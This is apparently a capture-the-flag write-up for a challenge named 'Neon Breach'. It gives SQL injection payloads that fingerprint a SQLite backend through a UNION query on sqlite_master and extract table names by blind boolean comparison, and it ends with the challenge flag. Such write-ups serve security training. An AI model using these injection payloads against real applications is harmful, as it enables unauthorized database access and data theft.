# Neon Breach

1. Identified the database as SQLite by inputting:
- ```1 UNION ALL SELECT 1,2,3,4,5,6,7,8,9 FROM sqlite_master WHERE 1=1--+```

2. Fuzzed out the table name by hand using:- 
- ```1 AND (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET 0) > HEX('A')```

3. Fuzzed out the column names and the rows using the same idea.

- [Column Fuzzer](./blind_sqlite_column_fuzzer.py)
- [Row Fuzzer](./blind_sqlite_row_fuzzer.py)

> Flag : MUSCTCTF{D4t4_br3ach_1s_s3cur!ty_1ncident!!!}